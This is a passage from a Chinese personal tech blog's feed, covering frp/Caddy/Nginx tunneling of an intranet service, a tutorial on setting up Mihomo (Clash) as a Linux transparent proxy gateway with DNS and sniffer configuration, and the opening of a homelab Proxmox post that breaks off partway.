caddy。当公网用户访问公网服务器时，使用的是 caddy 提供的 https 连接，然后 caddy 将 https 解密为 http 后将请求转发到 frpc 中，frpc 将请求套一层 STCP 加密后会丢给 frps，frps 再通过已与内网环境建立的连接，将请求传递给内网环境中的 frpc，然后内网环境的 frpc 将 STCP 解密得到公网用户原始的 http 请求，将请求再转发给内网的 http 服务器（如 Nginx），http 服务再去请求内网环境部署的各种服务即可。整体的流程如下：</p><p><img src="https://esunr-image-bed.oss-cn-beijing.aliyuncs.com/picgo/202505221349091.png" alt=""></p><p>Caddy 配置：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">app.example.site &#123;</span><br><span class="line">    reverse_proxy localhost:1443</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>公网服务器 frpc 配置：</p><figure class="highlight toml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">serverAddr</span> = <span class="string">&quot;127.0.0.1&quot;</span></span><br><span class="line"><span class="attr">serverPort</span> = <span class="number">6666</span></span><br><span class="line"></span><br><span class="line"><span class="section">[[visitors]]</span></span><br><span class="line"><span class="attr">name</span> = <span class="string">&quot;secret_http_visitor&quot;</span></span><br><span class="line"><span class="attr">type</span> = <span class="string">&quot;stcp&quot;</span></span><br><span class="line"><span class="attr">serverName</span> = <span class="string">&quot;secret_http&quot;</span></span><br><span class="line"><span class="attr">secretKey</span> = <span class="string">&quot;your-secret&quot;</span></span><br><span class="line"><span class="attr">bindAddr</span> = <span class="string">&quot;127.0.0.1&quot;</span></span><br><span class="line"><span class="attr">bindPort</span> = <span class="number">1443</span></span><br></pre></td></tr></table></figure><p>公网服务器 frps 配置：</p><figure class="highlight toml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">bindPort</span> = <span class="number">6666</span></span><br></pre></td></tr></table></figure><p>内网 frpc 配置：</p><figure class="highlight toml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">serverAddr</span> = <span class="string">&quot;111.123.10.1&quot;</span></span><br><span class="line"><span class="attr">serverPort</span> = <span class="number">6666</span></span><br><span class="line"></span><br><span class="line"><span class="section">[[proxies]]</span></span><br><span class="line"><span class="attr">name</span> = <span class="string">&quot;secret_http&quot;</span></span><br><span class="line"><span class="attr">type</span> = <span class="string">&quot;stcp&quot;</span></span><br><span class="line"><span class="attr">secretKey</span> = <span class="string">&quot;your-secret&quot;</span></span><br><span class="line"><span class="attr">localIp</span> = <span class="string">&quot;127.0.0.1&quot;</span></span><br><span class="line"><span class="attr">localPort</span> = <span class="number">80</span></span><br></pre></td></tr></table></figure><p>内网 Nginx 反向代理配置，请求 Origin 为 <code>app.example.site</code> 的请求转发至 <code>http://127.0.0.1:2222</code>（仅供参考）：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">    listen 80 ; </span><br><span class="line">    server_name app.example.site; </span><br><span class="line">    index index.html; </span><br><span class="line">    proxy_set_header Host $host; </span><br><span class="line">    proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; </span><br><span class="line">    proxy_set_header X-Forwarded-Host $server_name; </span><br><span class="line">    proxy_set_header X-Real-IP $remote_addr; </span><br><span class="line">    proxy_http_version 1.1; </span><br><span class="line">    proxy_set_header Upgrade $http_upgrade; </span><br><span class="line">    proxy_set_header Connection $http_connection; </span><br><span class="line">    client_max_body_size 5120M;</span><br><span class="line">    </span><br><span class="line">    location ^~ / &#123;</span><br><span class="line">    proxy_pass http://127.0.0.1:2222; </span><br><span class="line">    proxy_set_header Host $host; </span><br><span class="line">    proxy_set_header X-Real-IP $remote_addr; </span><br><span class="line">    proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; </span><br><span class="line">    proxy_set_header REMOTE-HOST $remote_addr; </span><br><span class="line">    proxy_set_header Upgrade $http_upgrade; </span><br><span class="line">    proxy_set_header Connection $http_connection; </span><br><span class="line">    proxy_set_header X-Forwarded-Proto $scheme; </span><br><span class="line">    proxy_http_version 1.1; </span><br><span class="line">    add_header X-Cache $upstream_cache_status; </span><br><span class="line">    add_header Cache-Control no-cache; </span><br><span class="line">    proxy_ssl_server_name off; </span><br><span class="line">    proxy_ssl_name $proxy_host; </span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这种模式下 frpc 与 frps 服务之间存在依赖关系，因此需要按照以下顺序启动：</p><ol><li>公网服务器的 frps</li><li>内网的 frpc 服务</li><li>公网服务器的 fprc</li></ol>]]></content>
      
      
      <categories>
          
          <category> 其他 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Caddy </tag>
            
            <tag> Nginx </tag>
            
            <tag> frp </tag>
            
            <tag> Canvas </tag>
            
            <tag> Https </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>使用 Mihomo(Clash) 搭建透明网关，使局域网设备科学上网</title>
      <link href="/2025/04/ec8dc9f7a09d.html"/>
      <url>/2025/04/ec8dc9f7a09d.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>本文只探讨在 Linux 设备下（如树莓派、迷你主机）开启 Clash，并将该设备作为透明网关供家庭其他设备使用这一场景，本文需要一定的网络原理基础。</p></blockquote><h1 id="0-什么是透明网关"><a href="#0-什么是透明网关" class="headerlink" title="0. 什么是透明网关"></a>0. 什么是透明网关</h1><p>如果一个设备想要科学上网，那么他可以在本机安装代理工具来进行网络访问。但是在一个局域网中，网关是可以自定义的，我们可以将希望科学上网的设备网关指向一台可以转发网络流量的设备，从而让这个设备帮我们把流量转发给代理工具，并让代理工具访问到资源后再返回给设备，这就实现了局域网设备无需安装任何代理工具就能实现科学上网的需求。</p><p><img src="https://esunr-image-bed.oss-cn-beijing.aliyuncs.com/picgo/202504081652374.png" alt="image.png|686"></p><p>其实“透明网关”和“旁路由”类似，都是非标准术语，只是社区上都这么叫。只是一般我们讲透明网关强调的是数据转发、拦截的功能，而旁路由可能还有 DHCP、NAT 等功能，旁路由安装了 OpenClash 之类的插件也能实现透明网关的功能。</p><blockquote><p>讲一下为啥不用 OpenClash 来做代理实现同样的功能，因为 OpenClash 设置太复杂了，并且我这边使用的效果会影响局域网内其他设备的网络访问，造成整个局域网都很慢，感觉有很多 BUG。并且 OpenWrt 的资源占用也不低，单纯为了实现透明网关的数据代理不如只用一个轻量的 Linux 系统 + Clash/Mihomo 核心来实现。</p></blockquote><h1 id="1-Clash-端开启-TUN-Mode"><a href="#1-Clash-端开启-TUN-Mode" class="headerlink" title="1. Clash 端开启 TUN Mode"></a>1. Clash 端开启 TUN Mode</h1><h2 id="1-1-使用-Clash（不推荐）"><a href="#1-1-使用-Clash（不推荐）" class="headerlink" title="1.1 使用 Clash（不推荐）"></a>1.1 使用 Clash（不推荐）</h2><p>安装 Clash permium 版本： <a href="https://github.com/Dreamacro/clash/releases/tag/premium">https://github.com/Dreamacro/clash/releases/tag/premium</a></p><blockquote><p>注意：开源的普通版本不支持 TUN Mode，无法搭建透明网关</p></blockquote><p>Clash 2022 年 3 月的更新在 TUN Mode 的配置中加入了 <code>auto-route</code> 与 <code>auto-detect-interface</code> 两项配置，极大的方便了 Linux 设备开启 TUN 模式，不需要再额外设置 iptables 与 tproxy。</p><p>首先在 Clash 配置文件中写入 DNS 与 TUN 配置：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">dns:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">listen:</span> <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span><span class="string">:53</span></span><br><span class="line">  <span class="attr">enhanced-mode:</span> <span class="string">fake-ip</span></span><br><span class="line">  <span class="attr">nameserver:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="number">114.114</span><span class="number">.114</span><span class="number">.114</span></span><br><span class="line">    <span class="bullet">-</span> <span class="number">223.5</span><span class="number">.5</span><span class="number">.5</span></span><br><span class="line">    <span class="bullet">-</span> <span class="number">8.8</span><span class="number">.8</span><span class="number">.8</span></span><br><span class="line"><span class="attr">tun:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">stack:</span> <span class="string">system</span></span><br><span class="line">  <span class="attr">dns-hijack:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">any:53</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">tcp://any:53</span></span><br><span class="line">  <span class="attr">auto-route:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">auto-detect-interface:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure><p>此时再执行 Clash 服务时就已经开启了 TUN Mode。</p><h2 id="1-2-使用-Mihomo（建议）"><a href="#1-2-使用-Mihomo（建议）" class="headerlink" title="1.2 使用 Mihomo（建议）"></a>1.2 使用 Mihomo（建议）</h2><p>由于 Clash 作者删库跑路了，Clash.Meta 项目也换了个名字叫 Mihomo 继续维护，因此我们将会使用 Mihomo 来实现透明代理功能。</p><p>按照官方教程下载 Mihomo 核心，并将其注册为系统服务：</p><ul><li>下载：<a href="https://wiki.metacubex.one/startup/">https://wiki.metacubex.one/startup/</a></li><li>注册为系统服务：<a href="https://wiki.metacubex.one/startup/service/">https://wiki.metacubex.one/startup/service/</a></li></ul><h1 id="2-开启流量转发"><a href="#2-开启流量转发" class="headerlink" title="2. 开启流量转发"></a>2. 开启流量转发</h1><p>在 Linux 环境下，默认是不转发流量的，也就是说如果将当前设备作为网关，是无法正常上网的。</p><p>编辑 /etc/sysctl.conf 文件</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/sysctl.conf</span><br></pre></td></tr></table></figure><p>将以下代码取消注释</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net.ipv4.ip_forward=1</span><br><span class="line">net.ipv6.conf.all.forwarding=1</span><br></pre></td></tr></table></figure><p>加载内核参数</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sysctl -p</span><br></pre></td></tr></table></figure><p>然后我们要在想使用透明代理的设备上进行如下设置（以 IOS 为示例）：</p><ul><li>在 Wifi 详情中，『配置IP』选项选择手动：<ul><li>『IP地址』输入一个内网地址，即手动为你的设备分配一个内网 IPv4 的地址；</li><li>『子网掩码』输入 255.255.255.0；</li><li>『路由器』输入运行 Clash 的设备的内网地址；</li></ul></li><li>选择『配置DNS』为手动，并添加服务器，IP 为当前运行 Clash 的设备的内网地址；</li></ul><p>按道理来讲的话进行这样的设置后即可让内网设备发送的数据包都被 Clash 进行代理，但是，由于 Linux 环境比较复杂，你可能会出现手机还是无法访问外网的情况，那么就要继续看下去这篇文章了。</p><p>开启 TUN Mode 后，可能会遇到 <a href="https://github.com/Dreamacro/clash/issues/2671"><code>dns-hijack</code> 失败的情况</a>（如 Ubuntu 22），具体的表现为访问 <a href="http://clash.razord.top/">Clash 控制面板</a> 的日志选项时，会发现所有的域名规则都失效了，请求会直接落到 IP 请求规则上，最后匹配到兜底的 MATCH 规则。</p><p>要想搞清楚原因，就要明白在 Linux 系统的 DNS 解析到底经过了什么流程：</p><ul><li>首先用户对一个域名发起 HTTP 请求前，会首先发起 DNS 解析请求；</li><li>Linux 在发起 DNS 解析请求时，会参照 <code>/etc/resolv.conf</code> 文件的配置来进行请求，这个文件中配置了 DNS 解析的服务器、超时时间、传输协议等信息，比如 nameserver 定义了DNS 服务器为 <code>8.8.8.8</code>，那么 DNS 请求就会发送给 <code>8.8.8.8</code> 这个服务器（DNS 请求是一个 UDP 请求，并且访问的是 53 端口）；</li><li>DNS 请求完毕，获取到目标 IP；</li><li>构建 HTTP 请求报文，才向目标服务器发送请求。</li></ul><p>但是在常见的 Linux 发行版中，为了优化 DNS 请求（比如缓存 DNS）以及进行一些其他操作，<code>resolv.conf</code> 文件的控制权可能被其他应用拦截，以 Ubuntu 为例，<code>resolv.conf</code> 文件时由 <code>systemd-resolved</code> 控制的，当你去尝试直接修改该配置文件时，就会出现如下警告：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"># This is /run/systemd/resolve/stub-resolv.conf managed by man:systemd-resolved(8).</span><br><span class="line"># Do not edit.</span><br><span class="line">#</span><br><span class="line"># This file might be symlinked as /etc/resolv.conf. If you&#x27;re looking at</span><br><span class="line"># /etc/resolv.conf and seeing this text, you have followed the symlink.</span><br><span class="line">#</span><br><span class="line"># This is a dynamic resolv.conf file for connecting local clients to the</span><br><span class="line"># internal DNS stub resolver of systemd-resolved. This file lists all</span><br><span class="line"># configured search domains.</span><br><span class="line">#</span><br><span class="line"># Run &quot;resolvectl status&quot; to see details about the uplink DNS servers</span><br><span class="line"># currently in use.</span><br><span class="line">#</span><br><span class="line"># Third party programs should typically not access this file directly, but only</span><br><span class="line"># through the symlink at /etc/resolv.conf. To manage man:resolv.conf(5) in a</span><br><span class="line"># different way, replace this symlink by a static file or a different symlink.</span><br><span class="line">#</span><br><span class="line"># See man:systemd-resolved.service(8) for details about the supported modes of</span><br><span class="line"># operation for /etc/resolv.conf.</span><br></pre></td></tr></table></figure><p>这个意思是如果你直接修改了这个文件，那么就会影响到 <code>systemd-resolved</code>，并且你修改了也是没有用的，在服务重启后，<code>systemd-resolved</code> 就会重写这个文件，你做的变更不会被保留下来。</p><p>经过 <code>systemd-resolved</code> 的修改，<code>resolv.conf</code> 文件的 <code>nameserver</code> 配置会被设置为 <code>127.0.0.53</code>，可以很容易的发现，这并不是一个线上的 DNS 服务器，而是一个本地 IP，这个就是  <code>systemd-resolved</code> 创建的本地 DNS 解析服务器。如果是在一个局域网中，<code>systemd-resolved</code> 还会把 DNS 服务器的目标地址再转为路由器（网关）的IP。这样就形成了如下的流程：</p><ul><li>发起 DNS 请求</li><li>DNS 请求目标地址为 <code>127.0.0.53:53</code>，即  <code>systemd-resolved</code> 的本地 DNS 服务器</li><li>检查本地 DNS 服务器有无缓存，如果没有缓存，转发给路由器（网关）的 DNS 服务器（如 192.168.123.1）</li><li>检查网关层有无缓存，如果没有缓存才将请求转发给公网 DNS 服务器，如 <code>114.114.114</code></li></ul><p>那么 Clash 的 dns-hijack 有一个很重要的特性，就是 <strong>dns-hijack 不会去拦截本地的 DNS 服务器</strong>。我们不难发现，经过 <code>systemd-resolved</code> 的操作，DNS 请求在本机发出请求的目标 IP 为路由器（网关）的IP，这就不难解释为什么 dns-hijack 失效了，因为 Clash 全程都没有拦截到任何一个向公网发出的 DNS 请求，真正的 DNS 请求都交给路由器（网关）处理了。经过处理后的 DNS 请求转化成 IP 之后再发出 HTTP 请求，所以 Clash 拿到的只是一个目标 IP，这也解释了为什么所有的域名规则匹配失败了。</p><p>综上，解决这个问题有两个方案：</p><h2 id="2-1-完全拦截系统-DNS-服务（不建议）"><a href="#2-1-完全拦截系统-DNS-服务（不建议）" class="headerlink" title="2.1 完全拦截系统 DNS 服务（不建议）"></a>2.1 完全拦截系统 DNS 服务（不建议）</h2><p>简单粗暴，直接禁用 <code>systemd-resolved</code>：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl <span class="built_in">disable</span> systemd-resolved</span><br></pre></td></tr></table></figure><p>如果还不行就手动在 <code>resolv.conf</code> 文件中将 <code>nameserver</code> 设置为一个外网的 DNS 服务器 IP（如 8.8.8.8），这样 DNS 请求都会被 Clash 的 dns-hijack 拦截，然后返回 fake-ip，执行匹配规则等后续流程。</p><p>但这样有个问题，当 Clash 关闭后，这台机子就完全无法联网了，同时，关闭 <code>systemd-resolved</code> 可能会造成一些其他问题（比如桌面端的 Ubuntu 无法正常的显示网络连接图标等）。</p><p>那么就需要使用一个侵入性较小的方案</p><h2 id="2-2-手动指定-systemd-resolved-的-nameserver（不建议）"><a href="#2-2-手动指定-systemd-resolved-的-nameserver（不建议）" class="headerlink" title="2.2 手动指定 systemd-resolved 的 nameserver（不建议）"></a>2.2 手动指定 systemd-resolved 的 nameserver（不建议）</h2><p>既然 Clash 无法拦截本地 DNS 请求，那就保证 DNS 在网卡发出的请求目标地址不要为路由器（网关）的 IP就可以了，这个通过修改 <code>systemd-resolved</code> 服务的配置文件可以实现。</p><p>打开 <code>/etc/systemd/resolved.conf</code> 文件，并修改 nameserver 为任意一个外网 IP，这样 DNS 请求就不会转发给路由器了，而是直接尝试向外网 DNS 服务器发起请求，这样就可以被 Clash 拦截到了~</p><p>但此时还有些小问题，如果我们直接请求外网 DNS 服务器，那我们在路由器 host 中配置的本地域名就无法读取到了，我们可以将 Clash 的 DNS 服务器列表中手动加上路由器 IP 来解决。</p><p>此时如果使用透明代理的方式，需要将设备的 DNS 修改为任意一个外网 DNS 服务器 IP，<strong>不能设置为 Clash 部署机子的内网 IP 了</strong>，否则还是会导致 Clash 无法拦截 DNS 请求。</p><h2 id="2-3-开启-Sniffer-域名嗅探器（推荐）"><a href="#2-3-开启-Sniffer-域名嗅探器（推荐）" class="headerlink" title="2.3 开启 Sniffer 域名嗅探器（推荐）"></a>2.3 开启 Sniffer 域名嗅探器（推荐）</h2><blockquote><p>注意只有 mihomo、clash.meta 才有此功能。</p></blockquote><p>如下是目前一个比较完美的透明网关配置，无需处理 <code>systemd-resolved</code>：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 是否允许内核接受 IPv6 流量</span></span><br><span class="line"><span class="attr">ipv6:</span> <span class="literal">true</span></span><br><span class="line"><span class="comment"># 允许其他设备经过 Clash 的代理端口</span></span><br><span class="line"><span class="attr">allow-lan:</span> <span class="literal">true</span></span><br><span class="line"><span class="comment"># 开启统一延迟时，会计算 RTT，以消除连接握手等带来的不同类型节点的延迟差异</span></span><br><span class="line"><span class="attr">unified-delay:</span> <span class="literal">false</span></span><br><span class="line"><span class="comment"># TCP 并发</span></span><br><span class="line"><span class="attr">tcp-concurrent:</span> <span class="literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 控制是否让 Clash 去匹配进程，设置为 strict，由 Clash 判断是否开启</span></span><br><span class="line"><span class="attr">find-process-mode:</span> <span class="string">strict</span></span><br><span class="line"><span class="comment"># 全局 TLS 指纹，优先低于 proxy 内的 client-fingerprint</span></span><br><span class="line"><span class="attr">global-client-fingerprint:</span> <span class="string">chrome</span></span><br><span class="line"></span><br><span class="line"><span class="attr">profile:</span></span><br><span class="line">  <span class="comment"># 储存 API 对策略组的选择，以供下次启动时使用</span></span><br><span class="line">  <span class="attr">store-selected:</span> <span class="literal">true</span></span><br><span class="line">  <span class="comment"># 储存 fakeip 映射表，域名再次发生连接时，使用原有映射地址</span></span><br><span class="line">  <span class="attr">store-fake-ip:</span> <span class="literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 域名嗅探：https://wiki.metacubex.one/config/sniff/</span></span><br><span class="line"><span class="comment"># 用于解决流量到达 Clash 时只有 IP 没有域名的问题</span></span><br><span class="line"><span class="attr">sniffer:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">sniff:</span></span><br><span class="line">    <span class="attr">HTTP:</span></span><br><span class="line">      <span class="attr">ports:</span> [<span class="number">80</span>, <span class="number">8080</span><span class="number">-8880</span>]</span><br><span class="line">      <span class="attr">override-destination:</span> <span class="literal">true</span></span><br><span class="line">    <span class="attr">TLS:</span></span><br><span class="line">      <span class="attr">ports:</span> [<span class="number">443</span>, <span class="number">8443</span>]</span><br><span class="line">    <span class="attr">QUIC:</span></span><br><span class="line">      <span class="attr">ports:</span> [<span class="number">443</span>, <span class="number">8443</span>]</span><br><span class="line">  <span class="attr">skip-domain:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">&quot;Mijia Cloud&quot;</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">&quot;+.push.apple.com&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 开启虚拟网卡处理流量</span></span><br><span class="line"><span class="attr">tun:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">stack:</span> <span class="string">mixed</span></span><br><span class="line">  <span class="attr">dns-hijack:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">&quot;any:53&quot;</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">&quot;tcp://any:53&quot;</span></span><br><span class="line">  <span class="attr">auto-route:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">auto-redirect:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">auto-detect-interface:</span> <span class="literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 开启 Clash 内置的 DNS 服务，嗅探服务需要用到</span></span><br><span class="line"><span class="attr">dns:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">ipv6:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">enhanced-mode:</span> <span class="string">fake-ip</span></span><br><span class="line">  <span class="attr">fake-ip-filter:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">&quot;*&quot;</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">&quot;+.lan&quot;</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">&quot;+.local&quot;</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">&quot;+.market.xiaomi.com&quot;</span></span><br><span class="line">  <span class="attr">default-nameserver:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">tls://223.5.5.5</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">tls://223.6.6.6</span></span><br><span class="line">  <span class="attr">nameserver:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">https://doh.pub/dns-query</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">https://dns.alidns.com/dns-query</span></span><br></pre></td></tr></table></figure><p>这里简单讲一下数据通过 Mihomo/Clash 的流程：</p><ol><li>局域网设备请求 google.com，发起 DNS 请求；</li><li>DNS 请求转发到透明代理层，被 Mihomo 的 DNS 服务拦截，Mihomo 发现使用的是 fake-ip 模式同时启用了域名嗅探，就会生成一个在记录中唯一的虚假 ip 地址提供给局域网设备，并在映射表中记录下 fake-ip 和域名的对应关系；</li><li>局域网设备获取到 DNS 返回的 IP 后浏览器向目标 IP 发起请求；</li><li>数据包再次来到透明代理，此时透明代理通过数据包只能看到 IP，看不到请求的真实域名，但是由于第二步中记录了 fake-ip 对应的真实域名，因此读取映射表获取真实 IP；</li><li>按照 Mihomo 的节点规则配置，进行域名规则匹配，如果匹配到敏感域名则走代理节点。域名无匹配规则时则会发起本地或者远程 DNS 请求（这里不太清楚逻辑）获取真实 IP，再根据 GEOIP 信息选择走节点代理还是走本地流量；</li></ol><p>这里需要注意：tun、dns、sniffer 是必须配置的，否则会出现网络无法访问、DNS 请求失败、https 证书返回了其他网站的等奇怪的问题。</p><p>关于 DNS 劫持、fake-ip、域名嗅探等细节，可以观看视频：<a href="https://www.youtube.com/watch?v=aKlH6KRt9Jc&t=911s&ab_channel=%E4%B8%8D%E8%89%AF%E6%9E%97">https://www.youtube.com/watch?v=aKlH6KRt9Jc&amp;t=911s&amp;ab_channel=%E4%B8%8D%E8%89%AF%E6%9E%97</a></p><h1 id="3-已知问题"><a href="#3-已知问题" class="headerlink" title="3. 已知问题"></a>3. 已知问题</h1><p>如果禁用了系统的 dns 服务，会导致在 clash 服务启动之前的所有服务的 dns 查找都崩溃，比如 nginx、frpc 等。解决方法是在 clash 服务启动之后再启动其他的服务。</p><p>此外，如果使用了 homeassistant，Homekit 插件也会因为 Clash 对 DNS 的干扰，导致配件无响应。解决方法是先启动 Homeassistant，然后再启动 Clash。</p><p>参考教程：</p><ul><li><a href="https://lvv.me/posts/2022/09/12_clash_as_router/">Clash 旁路由透明网关</a></li><li><a href="https://little-star.love/posts/5d083060">https://little-star.love/posts/5d083060</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 其他 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Clash </tag>
            
            <tag> Mihomo </tag>
            
            <tag> 科学上网 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HomeLab 家庭服务器折腾日记</title>
      <link href="/2025/04/9dc9594be9bc.html"/>
      <url>/2025/04/9dc9594be9bc.html</url>
      
        <content type="html"><![CDATA[<h1 id="1-网络结构安排"><a href="#1-网络结构安排" class="headerlink" title="1. 网络结构安排"></a>1. 网络结构安排</h1><p>家庭中有一台 N100 小主机，平常只用来跑一个 Ubuntu 太浪费了，为了榨干主机性能于是打算使用 PVE 做一个 All in one 小主机，覆盖家里所有的网络管理以及搭建一些应用的需求。</p><p>我的 N100 小主机有两个网络接口，因此可以一个做 WAN 口来接入运营商网络，一个做 LAN 口来提供家庭内部的网络，同时在 PVE 上安装一个 ikuai 软路由系统负责路由功能，又整了 n 台 CR 8806 路由器刷上集客 AP 的系统来组无线网络，整体的网络拓扑设计如下：</p><p><img src="https://esunr-image-bed.oss-cn-beijing.aliyuncs.com/picgo/202504081501861.png" alt=""></p><p>光纤入户后接入光猫，光猫最好开启桥接模式，通过 WAN 口连接 N100 主机，内部的 iKuai 系统识别 WAN 口后进行拨号连接互联网，然后通过 vmbr 虚拟网桥将网络通向 PVE 内部的其他系统，以及物理 LAN 口。然后通过在物理 LAN 口接出一个交换器后，就可以将网络通向其他设备或者无线 AP。</p><p>N100 系统里安装了多个操作系统，iKuai 是用来做软路由的，Ubuntu 和 Windows 是主要使用的操作系统。此外我还加了一个没有桌面系统的 Ubuntu Server 来充当跳板机，内部安装了 FRP 内网传统服务，以及开放了 IPv6 访问，并做了 DDNS 动态域名绑定，来专门为外部提供网络访问。</p><h1 id="2-PVE"><a href="#2-PVE" class="headerlink" title="2. PVE"></a>2. PVE</h1><h3 id="系统安装"><a href="#系统安装" class="headerlink" title="系统安装"></a>系统安装</h3><p>从官网安装：<a href="https://pve.proxmox.com/wiki/Downloads">https://pve.proxmox.com/wiki/Downloads</a></p><p>烧录到 U 盘后，安装到 N100 主机中，这里不多描述了。</p><h3 id="网络设置"><a href="#网络设置" class="headerlink" 